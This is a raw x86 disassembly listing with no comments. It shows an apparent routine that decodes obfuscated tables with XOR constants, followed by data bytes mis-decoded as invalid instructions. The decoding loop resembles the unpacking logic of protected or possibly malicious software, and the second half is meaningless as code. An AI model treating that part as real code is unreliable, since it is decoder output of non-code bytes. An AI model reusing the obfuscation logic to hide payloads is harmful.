  41e3f6:	mov    edx,DWORD PTR ds:0x448d1c
  41e3fc:	sub    edx,0x401e6
  41e402:	neg    edx
  41e404:	sbb    edx,edx
  41e406:	mov    DWORD PTR ds:0x448d10,ecx
  41e40c:	and    edx,0xfb4f91cf
  41e412:	add    edx,0x4b0b8d6
  41e418:	xor    edx,ecx
  41e41a:	mov    DWORD PTR [eax+0x4],edx
  41e41d:	mov    edx,DWORD PTR ds:0x44800c
  41e423:	add    edx,0x10
  41e426:	mov    DWORD PTR ds:0x44800c,edx
  41e42c:	movzx  ecx,BYTE PTR [edx+0x4]
  41e430:	movzx  edi,WORD PTR [edx+0x2]
  41e434:	movzx  edx,BYTE PTR [edx]
  41e437:	shl    ecx,0x10
  41e43a:	add    ecx,edi
  41e43c:	shl    ecx,0x8
  41e43f:	add    ecx,edx
  41e441:	mov    DWORD PTR ds:0x448d10,ecx
  41e447:	mov    edx,0x4b4babc
  41e44c:	sub    edx,DWORD PTR ds:0x448d1c
  41e452:	xor    edx,ecx
  41e454:	mov    DWORD PTR [eax+0x8],edx
  41e457:	mov    edx,DWORD PTR ds:0x44800c
  41e45d:	movzx  ecx,WORD PTR [edx+0xa]
  41e461:	movzx  edi,BYTE PTR [edx+0x8]
  41e465:	movzx  edx,BYTE PTR [edx+0x6]
  41e469:	shl    ecx,0x8
  41e46c:	add    ecx,edi
  41e46e:	shl    ecx,0x8
  41e471:	add    ecx,edx
  41e473:	mov    edx,DWORD PTR ds:0x448d1c
  41e479:	sub    edx,0x401e6
  41e47f:	neg    edx
  41e481:	sbb    edx,edx
  41e483:	and    edx,0xfb4f91cf
  41e489:	mov    DWORD PTR ds:0x448d10,ecx
  41e48f:	add    edx,0x4b0b8d6
  41e495:	xor    edx,ecx
  41e497:	mov    DWORD PTR [eax+0xc],edx
  41e49a:	mov    edx,DWORD PTR ds:0x44800c
  41e4a0:	add    edx,0x10
  41e4a3:	mov    DWORD PTR ds:0x44800c,edx
  41e4a9:	movzx  ecx,BYTE PTR [edx+0x4]
  41e4ad:	movzx  edi,WORD PTR [edx+0x2]
  41e4b1:	movzx  edx,BYTE PTR [edx]
  41e4b4:	shl    ecx,0x10
  41e4b7:	add    ecx,edi
  41e4b9:	shl    ecx,0x8
  41e4bc:	add    ecx,edx
  41e4be:	mov    edx,0x4b4babc
  41e4c3:	sub    edx,DWORD PTR ds:0x448d1c
  41e4c9:	mov    DWORD PTR ds:0x448d10,ecx
  41e4cf:	xor    edx,ecx
  41e4d1:	mov    DWORD PTR [eax+0x10],edx
  41e4d4:	mov    edx,DWORD PTR ds:0x44800c
  41e4da:	movzx  ecx,WORD PTR [edx+0xa]
  41e4de:	movzx  edi,BYTE PTR [edx+0x8]
  41e4e2:	shl    ecx,0x8
  41e4e5:	add    ecx,edi
  41e4e7:	movzx  edx,BYTE PTR [edx+0x6]
  41e4eb:	shl    ecx,0x8
  41e4ee:	add    ecx,edx
  41e4f0:	mov    edx,DWORD PTR ds:0x448d1c
  41e4f6:	sub    edx,0x401e6
  41e4fc:	neg    edx
  41e4fe:	sbb    edx,edx
  41e500:	and    edx,0xfb4f91cf
  41e506:	add    edx,0x4b0b8d6
  41e50c:	xor    edx,ecx
  41e50e:	mov    DWORD PTR ds:0x448d10,ecx
  41e514:	mov    DWORD PTR [eax+0x14],edx
  41e517:	mov    edx,DWORD PTR ds:0x44800c
  41e51d:	add    edx,0x10
  41e520:	mov    DWORD PTR ds:0x44800c,edx
  41e526:	movzx  ecx,BYTE PTR [edx+0x4]
  41e52a:	movzx  edi,WORD PTR [edx+0x2]
  41e52e:	movzx  edx,BYTE PTR [edx]
  41e531:	shl    ecx,0x10
  41e534:	add    ecx,edi
  41e536:	shl    ecx,0x8
  41e539:	add    ecx,edx
  41e53b:	mov    DWORD PTR ds:0x448d10,ecx
  41e541:	mov    edx,0x4b4babc
  41e546:	sub    edx,DWORD PTR ds:0x448d1c
  41e54c:	xor    edx,ecx
  41e54e:	mov    DWORD PTR [eax+0x18],edx
  41e551:	mov    edx,DWORD PTR ds:0x44800c
  41e557:	movzx  ecx,WORD PTR [edx+0xa]
  41e55b:	movzx  edi,BYTE PTR [edx+0x8]
  41e55f:	movzx  edx,BYTE PTR [edx+0x6]
  41e563:	shl    ecx,0x8
  41e566:	add    ecx,edi
  41e568:	shl    ecx,0x8
  41e56b:	add    ecx,edx
  41e56d:	mov    edx,DWORD PTR ds:0x448d1c
  41e573:	sub    edx,0x401e6
  41e579:	neg    edx
  41e57b:	sbb    edx,edx
  41e57d:	and    edx,0xfb4f91cf
  41e583:	add    edx,0x4b0b8d6
  41e589:	xor    edx,ecx
  41e58b:	mov    DWORD PTR ds:0x448d10,ecx
  41e591:	mov    DWORD PTR [eax+0x1c],edx
  41e594:	mov    edx,DWORD PTR ds:0x44800c
  41e59a:	add    edx,0x10
  41e59d:	mov    DWORD PTR ds:0x44800c,edx
  41e5a3:	movzx  ecx,BYTE PTR [edx+0x4]
  41e5a7:	movzx  edi,WORD PTR [edx+0x2]
  41e5ab:	movzx  edx,BYTE PTR [edx]
  41e5ae:	shl    ecx,0x10
  41e5b1:	add    ecx,edi
  41e5b3:	shl    ecx,0x8
  41e5b6:	add    ecx,edx
  41e5b8:	mov    DWORD PTR ds:0x448d10,ecx
  41e5be:	mov    edx,0x4b4babc
  41e5c3:	sub    edx,DWORD PTR ds:0x448d1c
  41e5c9:	xor    edx,ecx
  41e5cb:	mov    DWORD PTR [eax+0x20],edx
  41e5ce:	mov    edx,DWORD PTR ds:0x44800c
  41e5d4:	movzx  ecx,WORD PTR [edx+0xa]
  41e5d8:	movzx  edi,BYTE PTR [edx+0x8]
  41e5dc:	movzx  edx,BYTE PTR [edx+0x6]
  41e5e0:	shl    ecx,0x8
  41e5e3:	add    ecx,edi
  41e5e5:	shl    ecx,0x8
  41e5e8:	add    ecx,edx
  41e5ea:	mov    edx,DWORD PTR ds:0x448d1c
  41e5f0:	sub    edx,0x401e6
  41e5f6:	neg    edx
  41e5f8:	sbb    edx,edx
  41e5fa:	and    edx,0xfb4f91cf
  41e600:	add    edx,0x4b0b8d6
  41e606:	xor    edx,ecx
  41e608:	mov    DWORD PTR ds:0x448d10,ecx
  41e60e:	mov    DWORD PTR [eax+0x24],edx
  41e611:	mov    edx,DWORD PTR ds:0x44800c
  41e617:	add    edx,0x10
  41e61a:	add    eax,0x28
  41e61d:	mov    DWORD PTR ds:0x44800c,edx
  41e623:	dec    esi
  41e624:	jne    0x41e3b0
  41e62a:	movzx  ecx,BYTE PTR [edx+0x4]
  41e62e:	movzx  esi,WORD PTR [edx+0x2]
  41e632:	movzx  edx,BYTE PTR [edx]
  41e635:	mov    ebx,DWORD PTR ds:0x445064
  41e63b:	shl    ecx,0x10
  41e63e:	add    ecx,esi
  41e640:	shl    ecx,0x8
  41e643:	add    ecx,edx
  41e645:	mov    edx,DWORD PTR ds:0x448d1c
  41e64b:	add    edx,0x4acb6f0
  41e651:	xor    edx,ecx
  41e653:	mov    DWORD PTR ds:0x448d10,ecx
  41e659:	push   0x56
  41e65b:	mov    DWORD PTR [eax],edx
  41e65d:	call   ebx
  41e65f:	mov    edx,DWORD PTR ds:0x448d20
  41e665:	mov    ecx,DWORD PTR ds:0x448010
  41e66b:	add    edx,0x173a0
  41e671:	mov    esi,0x167
  41e676:	jmp    0x41e680
  41e678:	lea    esp,[esp+0x0]
  41e67f:	nop
  41e680:	movzx  eax,BYTE PTR [ecx+0x6]
  41e684:	movzx  edi,WORD PTR [ecx+0x3]
  41e688:	movzx  ecx,BYTE PTR [ecx]
  41e68b:	shl    eax,0x10
  41e68e:	add    eax,edi
  41e690:	shl    eax,0x8
  41e693:	add    eax,ecx
  41e695:	mov    ecx,DWORD PTR ds:0x448d1c
  41e69b:	add    ecx,0x143fe00e
  41e6a1:	xor    ecx,eax
  41e6a3:	mov    ds:0x448d10,eax
  41e6a8:	mov    DWORD PTR [edx],ecx
  41e6aa:	mov    ecx,DWORD PTR ds:0x448010
  41e6b0:	add    ecx,0x8
  41e6b3:	add    edx,0x4
  41e6b6:	dec    esi
  41e6b7:	mov    DWORD PTR ds:0x448010,ecx
  41e6bd:	jne    0x41e680
  41e6bf:	mov    esi,DWORD PTR ds:0x448d20
  41e6c5:	mov    eax,ds:0x448014
  41e6ca:	add    esi,0x1793c
  41e6d0:	mov    edi,0x20e
  41e6d5:	jmp    0x41e6e0
  41e6d7:	lea    esp,[esp+0x0]
  41e6de:	mov    edi,edi
  41e6e0:	movzx  edx,BYTE PTR [eax+0x7]
  41e6e4:	movzx  ecx,WORD PTR [eax+0x4]
  41e6e8:	movzx  eax,BYTE PTR [eax+0x1]
  41e6ec:	shl    edx,0x10
  41e6ef:	add    edx,ecx
  41e6f1:	shl    edx,0x8
  41e6f4:	add    edx,eax
  41e6f6:	push   0x55
  41e6f8:	mov    DWORD PTR ds:0x448d10,edx
  41e6fe:	call   ebx
  41e700:	mov    ecx,DWORD PTR ds:0x448d1c
  41e706:	sub    ecx,0x401e6
  41e70c:	neg    ecx
  41e70e:	sbb    ecx,ecx
  41e710:	and    ecx,0x71e6f9f8
  41e716:	add    ecx,0x8e191121
  41e71c:	xor    ecx,DWORD PTR ds:0x448d10
  41e722:	lea    edx,[esp+0x14]
  41e726:	mov    DWORD PTR [esi],ecx
  41e728:	push   edx
  41e729:	add    esi,0x4
  41e72c:	call   ebp
  41e72e:	mov    eax,ds:0x448014
  41e733:	add    eax,0x8
  41e736:	dec    edi
  41e737:	mov    ds:0x448014,eax
  41e73c:	jne    0x41e6e0
  41e73e:	mov    edx,DWORD PTR ds:0x448d20
  41e744:	mov    eax,0x440f00
  41e749:	add    edx,0x18174
  41e74f:	mov    esi,0xad
  41e754:	movzx  ecx,BYTE PTR [eax+0x5]
  41e758:	movzx  edi,WORD PTR [eax+0x2]
  41e75c:	shl    ecx,0x10
  41e75f:	add    ecx,edi
  41e761:	movzx  edi,BYTE PTR [eax]
  41e764:	shl    ecx,0x8
  41e767:	add    ecx,edi
  41e769:	mov    DWORD PTR ds:0x448d10,ecx
  41e76f:	mov    edi,0xe87a921e
  41e774:	sub    edi,DWORD PTR ds:0x448d1c
  41e77a:	add    eax,0x18
  41e77d:	xor    edi,ecx
  41e77f:	mov    DWORD PTR [edx],edi
  41e781:	movzx  ecx,BYTE PTR [eax-0xb]
  41e785:	movzx  edi,WORD PTR [eax-0xe]
  41e789:	shl    ecx,0x10
  41e78c:	add    ecx,edi
  41e78e:	movzx  edi,BYTE PTR [eax-0x10]
  41e792:	shl    ecx,0x8
  41e795:	add    ecx,edi
  41e797:	mov    DWORD PTR ds:0x448d10,ecx
  41e79d:	mov    edi,0xe87a921e
  41e7a2:	sub    edi,DWORD PTR ds:0x448d1c
  41e7a8:	add    edx,0xc
  41e7ab:	xor    edi,ecx
  41e7ad:	mov    DWORD PTR [edx-0x8],edi
  41e7b0:	movzx  ecx,BYTE PTR [eax-0x3]
  41e7b4:	movzx  edi,WORD PTR [eax-0x6]
  41e7b8:	shl    ecx,0x10
  41e7bb:	add    ecx,edi
  41e7bd:	movzx  edi,BYTE PTR [eax-0x8]
  41e7c1:	shl    ecx,0x8
  41e7c4:	add    ecx,edi
  41e7c6:	mov    edi,0xe87a921e
  41e7cb:	sub    edi,DWORD PTR ds:0x448d1c
  41e7d1:	mov    DWORD PTR ds:0x448d10,ecx
  41e7d7:	xor    edi,ecx
  41e7d9:	dec    esi
  41e7da:	mov    DWORD PTR [edx-0x4],edi
  41e7dd:	jne    0x41e754
  41e7e3:	mov    eax,ds:0x448d20
  41e7e8:	mov    edx,DWORD PTR ds:0x448018
  41e7ee:	add    eax,0x18990
  41e7f3:	mov    esi,0x74
  41e7f8:	jmp    0x41e800
  41e7fa:	lea    ebx,[ebx+0x0]
  41e800:	movzx  ecx,WORD PTR [edx+0x6]
  41e804:	movzx  edi,BYTE PTR [edx+0x4]
  41e808:	movzx  edx,BYTE PTR [edx]
  41e80b:	shl    ecx,0x8
  41e80e:	add    ecx,edi
  41e810:	shl    ecx,0x8
  41e813:	add    ecx,edx
  41e815:	mov    edx,DWORD PTR ds:0x448d1c
  41e81b:	mov    DWORD PTR ds:0x448d10,ecx
  41e821:	add    edx,0xd23ef4fa
  41e827:	xor    edx,ecx
  41e829:	mov    DWORD PTR [eax],edx
  41e82b:	mov    edx,DWORD PTR ds:0x448018
  41e831:	add    edx,0x8
  41e834:	mov    DWORD PTR ds:0x448018,edx
  41e83a:	movzx  ecx,WORD PTR [edx+0x6]
  41e83e:	movzx  edi,BYTE PTR [edx+0x4]
  41e842:	movzx  edx,BYTE PTR [edx]
  41e845:	shl    ecx,0x8
  41e848:	add    ecx,edi
  41e84a:	shl    ecx,0x8
  41e84d:	add    ecx,edx
  41e84f:	mov    edx,DWORD PTR ds:0x448d1c
  41e855:	mov    DWORD PTR ds:0x448d10,ecx
  41e85b:	add    edx,0xd23ef4fa
  41e861:	xor    edx,ecx
  41e863:	mov    DWORD PTR [eax+0x4],edx
  41e866:	mov    edx,DWORD PTR ds:0x448018
  41e86c:	add    edx,0x8
  41e86f:	mov    DWORD PTR ds:0x448018,edx
  41e875:	movzx  ecx,WORD PTR [edx+0x6]
  41e879:	movzx  edi,BYTE PTR [edx+0x4]
  41e87d:	movzx  edx,BYTE PTR [edx]
  41e880:	shl    ecx,0x8
  41e883:	add    ecx,edi
  41e885:	shl    ecx,0x8
  41e888:	add    ecx,edx
  41e88a:	mov    edx,DWORD PTR ds:0x448d1c
  41e890:	mov    DWORD PTR ds:0x448d10,ecx
  41e896:	add    edx,0xd23ef4fa
  41e89c:	xor    edx,ecx
  41e89e:	mov    DWORD PTR [eax+0x8],edx
  41e8a1:	mov    edx,DWORD PTR ds:0x448018
  41e8a7:	add    edx,0x8
  41e8aa:	mov    DWORD PTR ds:0x448018,edx
  41e8b0:	movzx  ecx,WORD PTR [edx+0x6]
  41e8b4:	movzx  edi,BYTE PTR [edx+0x4]
  41e8b8:	movzx  edx,BYTE PTR [edx]
  41e8bb:	shl    ecx,0x8
  41e8be:	add    ecx,edi
  41e8c0:	shl    ecx,0x8
  41e8c3:	add    ecx,edx
  41e8c5:	mov    edx,DWORD PTR ds:0x448d1c
  41e8cb:	mov    DWORD PTR ds:0x448d10,ecx
  41e8d1:	add    edx,0xd23ef4fa
  41e8d7:	xor    edx,ecx
  41e8d9:	mov    DWORD PTR [eax+0xc],edx
  41e8dc:	mov    edx,DWORD PTR ds:0x448018
  41e8e2:	add    edx,0x8
  41e8e5:	mov    DWORD PTR ds:0x448018,edx
  41e8eb:	movzx  ecx,WORD PTR [edx+0x6]
  41e8ef:	movzx  edi,BYTE PTR [edx+0x4]
  41e8f3:	movzx  edx,BYTE PTR [edx]
  41e8f6:	shl    ecx,0x8
  41e8f9:	add    ecx,edi
  41e8fb:	shl    ecx,0x8
  41e8fe:	add    ecx,edx
  41e900:	mov    edx,DWORD PTR ds:0x448d1c
  41e906:	add    edx,0xd23ef4fa
  41e90c:	xor    edx,ecx
  41e90e:	mov    DWORD PTR ds:0x448d10,ecx
  41e914:	mov    DWORD PTR [eax+0x10],edx
  41e917:	mov    edx,DWORD PTR ds:0x448018
  41e91d:	add    edx,0x8
  41e920:	mov    DWORD PTR ds:0x448018,edx
  41e926:	movzx  ecx,WORD PTR [edx+0x6]
  41e92a:	movzx  edi,BYTE PTR [edx+0x4]
  41e92e:	movzx  edx,BYTE PTR [edx]
  41e931:	shl    ecx,0x8
  41e934:	add    ecx,edi
  41e936:	shl    ecx,0x8
  41e939:	add    ecx,edx
  41e93b:	mov    edx,DWORD PTR ds:0x448d1c
  41e941:	add    edx,0xd23ef4fa
  41e947:	xor    edx,ecx
  41e949:	mov    DWORD PTR ds:0x448d10,ecx
  41e94f:	mov    DWORD PTR [eax+0x14],edx
  41e952:	mov    edx,DWORD PTR ds:0x448018
  41e958:	add    edx,0x8
  41e95b:	add    eax,0x18
  41e95e:	dec    esi
  41e95f:	mov    DWORD PTR ds:0x448018,edx
  41e965:	jne    0x41e800
  41e96b:	mov    eax,DWORD PTR [esp+0x10]
  41e96f:	pop    edi
  41e970:	pop    esi
  41e971:	pop    ebp
  41e972:	pop    ebx
  41e973:	test   eax,eax
  41e975:	je     0x41e97e
  41e977:	push   eax
  41e978:	call   DWORD PTR ds:0x44502c
  41e97e:	add    esp,0x428
  41e984:	ret    
  41e985:	int3   
  41e986:	int3   
  41e987:	int3   
  41e988:	int3   
  41e989:	int3   
  41e98a:	int3   
  41e98b:	int3   
  41e98c:	int3   
  41e98d:	int3   
  41e98e:	int3   
  41e98f:	int3   
  41e990:	or     bl,dl
  41e992:	inc    DWORD PTR [eax]
  41e994:	adc    bh,bh
  41e996:	jmp    ebx
  41e998:	sub    DWORD PTR ds:[esi],0x40
  41e99c:	add    BYTE PTR [eax],al
  41e99e:	jmp    FWORD PTR [ebx+0xff346f]
  41e9a4:	mov    bl,0xcc
  41e9a6:	mov    DWORD PTR [edx+eax*4-0x7d],esi
  41e9aa:	inc    ecx
  41e9ab:	dec    ecx
  41e9ac:	add    bh,bh
  41e9ae:	add    BYTE PTR [edi],bh
  41e9b0:	int3   
  41e9b1:	fiadd  DWORD PTR [eax]
  41e9b3:	inc    DWORD PTR [edi-0x1]
  41e9b6:	(bad)  
  41e9b7:	jns    0x41e9b1
  41e9b9:	dec    DWORD PTR [edx]
  41e9bb:	mov    ecx,esp
  41e9bd:	(bad)  
  41e9be:	jmp    FWORD PTR [ebp-0x1099]
  41e9c4:	test   bh,bh
  41e9c6:	dec    DWORD PTR [ebx]
  41e9c8:	inc    edi
  41e9c9:	add    ch,al
  41e9cb:	outs   dx,BYTE PTR ds:[esi]
  41e9cc:	add    bh,bh
  41e9ce:	or     DWORD PTR [ebx+0xff8cd0],0x2
  41e9d5:	(bad)  
  41e9d6:	(bad)  
  41e9d7:	out    dx,eax
  41e9d8:	jmp    0xcc8a74dc
  41e9dd:	inc    DWORD PTR [eax]
  41e9df:	pop    ds
  41e9e0:	pop    esp
  41e9e1:	mov    BYTE PTR [eax],0x0
  41e9e4:	into   
  41e9e5:	(bad)  
  41e9e6:	jmp    DWORD PTR [eax+0xb]
  41e9e9:	add    dh,dl
  41e9eb:	retf   
  41e9ec:	inc    DWORD PTR [eax]
  41e9ee:	cmp    DWORD PTR [ebx+0x2b],0xffffffdf
  41e9f2:	add    BYTE PTR [ebx+0x65ffff7c],al
  41e9f8:	stos   BYTE PTR es:[edi],al
  41e9f9:	int3   
  41e9fa:	sbb    al,0x9d
  41e9fc:	inc    DWORD PTR [eax]
  41e9fe:	jmp    FWORD PTR [ebx]
  41ea00:	mov    cl,ah
  41ea02:	(bad)  
  41ea03:	dec    DWORD PTR [ecx-0x7d]
  41ea06:	inc    ebp
  41ea08:	lods   al,BYTE PTR ds:[esi]
  41ea09:	call   FWORD PTR [ecx-0x2d]
  41ea0c:	cmp    edi,0x0
  41ea0f:	cmp    bl,BYTE PTR [eax-0x56ff009d]
  41ea15:	(bad)  
  41ea16:	push   DWORD PTR ds:0x3b4883c9
  41ea1c:	add    ah,cl
  41ea1e:	add    BYTE PTR [esi-0x7b],bl
  41ea21:	int    0x0
  41ea23:	jmp    DWORD PTR [ebx+eax*4]
  41ea26:	int3   
  41ea27:	sti    
  41ea28:	jns    0x41ea29
  41ea2a:	(bad)  
  41ea2c:	inc    DWORD PTR [eax]
  41ea2e:	(bad)  
  41ea2f:	(bad)  
  41ea30:	adc    BYTE PTR [edi-0x7cc0ff01],ah
  41ea36:	int3   
  41ea37:	aaa    
  41ea38:	(bad)  
  41ea39:	add    BYTE PTR [ecx],dh
  41ea3b:	in     eax,dx
  41ea3c:	(bad)  
  41ea3d:	inc    DWORD PTR [eax]
  41ea3f:	or     eax,0xff1f14
  41ea44:	xchg   edi,edi
  41ea46:	add    BYTE PTR [edx-0x4c],cl
  41ea49:	add    BYTE PTR [ebx],cl
  41ea4b:	retf   0xff89
  41ea4e:	add    BYTE PTR [ecx+0x46],ch
  41ea51:	and    al,0xff
  41ea53:	sub    DWORD PTR [eax],0xffffffcc
  41ea56:	add    BYTE PTR [esi],al
  41ea58:	repz inc DWORD PTR [eax+ebx*8-0x1]
  41ea5d:	add    BYTE PTR [eax],al
  41ea5f:	(bad)  
  41ea60:	cmp    DWORD PTR [ecx-0x34],eax
  41ea63:	jmp    DWORD PTR [edx+0x4157ffff]
  41ea69:	jmp    FWORD PTR [ebx-0xffff0d]
  41ea6f:	cmp    ah,BYTE PTR [ecx+0x2300ffb9]
  41ea75:	add    ah,cl
  41ea77:	xor    eax,0xfdda00dd
  41ea7c:	add    DWORD PTR [eax],0x0
  41ea7f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ea80:	jmp    0xd80eb72a
  41ea85:	(bad)  
  41ea86:	push   DWORD PTR [eax]
  41ea88:	add    ah,cl
  41ea8a:	xchg   DWORD PTR [edi-0x1],eax
  41ea8d:	cmp    edi,0xffffffe2
  41ea90:	cwde   
  41ea91:	addr16 (bad) 
  41ea93:	call   FWORD PTR [edx-0x1]
  41ea96:	add    BYTE PTR [edx-0x58a20092],dh
  41ea9c:	add    DWORD PTR [ebx+0x396180cc],0x0
  41eaa3:	add    BYTE PTR [ecx-0x1],dl
  41eaa6:	call   FWORD PTR [esi]
  41eaa8:	mov    BYTE PTR [eax],0xce
  41eaab:	loopne 0x41eaad
  41eaad:	add    BYTE PTR [eax],al
  41eaaf:	dec    eax
  41eab0:	push   esi
  41eab1:	adc    BYTE PTR [eax],al
  41eab3:	jmp    DWORD PTR ds:0xe58483ff
  41eab9:	add    bl,bh
  41eabb:	cmp    eax,DWORD PTR [eax]
  41eabd:	inc    DWORD PTR [eax]
  41eabf:	gs push edi
  41eac1:	xor    eax,DWORD PTR [eax]
  41eac3:	add    BYTE PTR [eax-0x1],dh
  41eac6:	push   DWORD PTR [esi]
  41eac8:	pusha  
  41eac9:	add    BYTE PTR [esi-0x33ffff83],al
  41eacf:	cmp    DWORD PTR [esi],ebp
  41ead1:	cmp    edi,edi
  41ead3:	(bad)  
  41ead4:	mov    eax,0xb8e0ff00
  41ead9:	add    BYTE PTR [edi],ch
  41eadb:	jne    0x41eadc
  41eadd:	inc    DWORD PTR [eax]
  41eadf:	xor    al,0x4
  41eae1:	xchg   bh,bh
  41eae3:	dec    DWORD PTR [eax+eax*1-0x1]
  41eae7:	cmp    dl,ah
  41eae9:	push   DWORD PTR [esp+eax*1]
  41eaec:	add    bh,bh
  41eaee:	jmp    DWORD PTR [ebx]
  41eaf0:	stos   DWORD PTR es:[edi],eax
  41eaf1:	mov    ds:0x3600cc,eax
  41eaf6:	mov    ebp,ebp
  41eaf8:	cdq    
  41eaf9:	adc    edi,0xffffffa0
  41eafc:	(bad)  
  41eafd:	(bad)  
  41eafe:	call   edi
  41eb00:	sahf   
  41eb01:	mov    al,0x0
  41eb03:	dec    DWORD PTR [esi]
  41eb05:	cmp    edi,0xffffffbc
  41eb08:	aam    0x0
  41eb0a:	mov    cl,0x7d
  41eb0c:	mov    edi,edi
  41eb0e:	int3   
  41eb0f:	data16 sbb al,0x26
  41eb12:	add    DWORD PTR [eax],0xfffffff0
  41eb15:	(bad)  
  41eb16:	jmp    ebp
  41eb18:	imul   edi,edi,0xffffffc6
  41eb1b:	(bad)  
  41eb1c:	(bad)  
  41eb1d:	(bad)  
  41eb1e:	inc    DWORD PTR [ecx-0x4c]
  41eb21:	aaa    
  41eb22:	(bad)  
  41eb23:	jmp    DWORD PTR [edx]
  41eb25:	mov    edi,edi
  41eb27:	push   cs
  41eb28:	(bad)  
  41eb29:	push   DWORD PTR [edi+0x29]
  41eb2c:	(bad)  
  41eb2d:	(bad)  
  41eb2e:	jmp    esi
  41eb30:	push   ebp
  41eb31:	sbb    esp,ecx
  41eb33:	cmp    DWORD PTR [ecx-0x1],0x0
  41eb37:	scas   al,BYTE PTR es:[edi]
  41eb38:	xor    al,BYTE PTR [ebx-0x33ffd22d]
  41eb3e:	jmp    FWORD PTR [edx]
  41eb40:	dec    esi
  41eb41:	sub    al,0xff
  41eb43:	cmp    DWORD PTR [eax-0x1],0x0
  41eb47:	sar    BYTE PTR [ebx+eax*4+0xc],0x79
  41eb4c:	(bad)  
  41eb4d:	(bad)  
  41eb4e:	inc    DWORD PTR [eax+ebp*1-0x79760083]
  41eb55:	(bad)  
  41eb56:	call   DWORD PTR [eax-0x5c]
  41eb59:	call   FWORD PTR [ecx-0x7c]
  41eb5c:	add    bh,bh
  41eb5e:	call   edi
  41eb60:	in     al,dx
  41eb61:	rol    DWORD PTR [eax],0x83
  41eb64:	cdq    
  41eb65:	inc    DWORD PTR [eax]
  41eb67:	sar    DWORD PTR [esi-0x1],1
  41eb6a:	enter  0x71,0xff
  41eb6e:	dec    DWORD PTR [eax+eax*2-0x60]
  41eb72:	add    bh,bh
  41eb74:	fmul   QWORD PTR [ecx-0x68d67d]
  41eb7a:	into   
  41eb7b:	add    DWORD PTR [eax],eax
  41eb7d:	(bad)  
  41eb7e:	call   FWORD PTR [ebp-0x7600584b]
  41eb84:	cwde   
  41eb85:	dec    esp
  41eb87:	popa   
  41eb88:	enter  0xea89,0x1d
  41eb8c:	mov    DWORD PTR [ebx+0x7bfe0700],eax
  41eb92:	dec    esp
  41eb94:	or     ecx,DWORD PTR [ecx-0xdfe600]
  41eb9a:	xchg   ecx,eax
  41eb9b:	test   al,0x89
  41eb9d:	(bad)  
  41eb9e:	push   DWORD PTR [edi+0xcc173a]
  41eba4:	add    DWORD PTR [eax],0x89615500
  41ebaa:	and    al,BYTE PTR [ebp+0x0]
  41ebad:	(bad)  
  41ebae:	inc    DWORD PTR [ecx]
  41ebb0:	sub    al,0x69
  41ebb2:	(bad)  
  41ebb3:	call   DWORD PTR [edi]
  41ebb5:	add    bh,bh
  41ebb7:	(bad)  
  41ebb8:	addr16 (bad) 
  41ebba:	fnstcw WORD PTR [ecx-0x337601]
  41ebc0:	mov    al,ds:0xf1ffffb9
  41ebc5:	mov    edi,edi
  41ebc7:	(bad)  
  41ebc8:	mov    ebp,0x8930edff
  41ebcd:	int3   
  41ebce:	add    ah,dh
  41ebd0:	pop    es
  41ebd1:	mov    dh,0x83
  41ebd3:	(bad)  
  41ebd4:	(bad)  
  41ebd5:	(bad)  
  41ebd6:	push   edi
  41ebd8:	and    al,0xcc
  41ebda:	loop   0x41ec05
  41ebdc:	add    BYTE PTR [ebx+0x429a35ff],al
  41ebe2:	add    BYTE PTR [ecx-0x560000ed],cl
  41ebe8:	adc    cl,ah
  41ebea:	(bad)  
  41ebeb:	xlat   BYTE PTR ds:[ebx]
  41ebec:	add    ah,cl
  41ebee:	dec    ebx
  41ebf0:	add    ecx,DWORD PTR [ebx+0x0]
  41ebf3:	int3   
  41ebf4:	pusha  
  41ebf5:	inc    DWORD PTR [eax]
  41ebf7:	imul   ebx,DWORD PTR [edi+0x1f4800],0x0
  41ebfe:	add    BYTE PTR [edi-0x333495],ch
  41ec04:	mov    ah,cl
  41ec06:	call   DWORD PTR [ebp+0x2c1fff56]
  41ec0c:	mov    edi,edi
  41ec0e:	dec    eax
  41ec10:	adc    edi,DWORD PTR [ebp+0xd0ffff]
  41ec16:	dec    ebp
  41ec18:	sub    al,BYTE PTR [ebx-0xac59]
  41ec1e:	inc    ecx
  41ec20:	aas    
  41ec21:	scas   eax,DWORD PTR es:[edi]
  41ec22:	mov    edi,edi
  41ec24:	call   0x3de9ec28
  41ec29:	int3   
  41ec2a:	xchg   DWORD PTR [ebx+eax*4-0x1],esp
  41ec2e:	int3   
  41ec2f:	dec    edi
  41ec30:	push   ebx
  41ec31:	fld    DWORD PTR [eax]
  41ec33:	add    BYTE PTR [eax+eax*1],ch
  41ec36:	int3   
  41ec37:	hlt    
  41ec38:	arpl   WORD PTR [eax],ax
  41ec3a:	push   esi
  41ec3b:	push   cs
  41ec3c:	(bad)  
  41ec3d:	(bad)  
  41ec3e:	dec    DWORD PTR [esi+0x5f]
  41ec41:	stos   BYTE PTR es:[edi],al
  41ec42:	dec    DWORD PTR [ecx-0x44000045]
  41ec48:	mov    ch,0xff
  41ec4a:	add    eax,0xff83ff02
  41ec4f:	cs ja  0x41ec98
  41ec52:	inc    DWORD PTR [eax]
  41ec54:	pop    ds
  41ec55:	inc    DWORD PTR [eax]
  41ec57:	push   ebp
  41ec58:	add    cl,BYTE PTR [ecx-0xff6e7e]
  41ec5e:	jmp    FWORD PTR [eax+esi*1+0x2683834d]
  41ec65:	add    bh,bh
  41ec67:	jne    0x41ebe9
  41ec69:	add    BYTE PTR [eax+0x83ff2f],bh
  41ec6f:	push   0xffffffe4
  41ec71:	push   edi
  41ec72:	add    bh,bh
  41ec74:	popf   
  41ec75:	(bad)  
  41ec76:	jmp    DWORD PTR [eax]
  41ec78:	adc    bh,bh
  41ec7a:	test   eax,0xffff00ae
  41ec7f:	lods   eax,DWORD PTR ds:[esi]
  41ec80:	add    bh,BYTE PTR [esi+0xceffcc]
  41ec86:	(bad)  
  41ec87:	mov    ecx,0xa640ffbf
  41ec8c:	add    DWORD PTR [eax],0xffffffff
  41ec8f:	daa    
  41ec90:	push   edx
  41ec91:	retf   0xff
  41ec94:	out    0xff,al
  41ec96:	inc    DWORD PTR [edi-0x65]
  41ec99:	int3   
  41ec9a:	cmp    eax,0xcc89ff94
  41ec9f:	ja     0x41ecbb
  41eca1:	ror    esp,0x0
  41eca4:	xchg   edx,eax
  41eca5:	add    DWORD PTR [ebx+0x89a07a],0xffffffe7
  41ecac:	add    BYTE PTR [eax],al
  41ecae:	int3   
  41ecaf:	xchg   ebp,eax
  41ecb0:	cwde   
  41ecb1:	sbb    BYTE PTR [eax],al
  41ecb3:	add    BYTE PTR [edi],cl
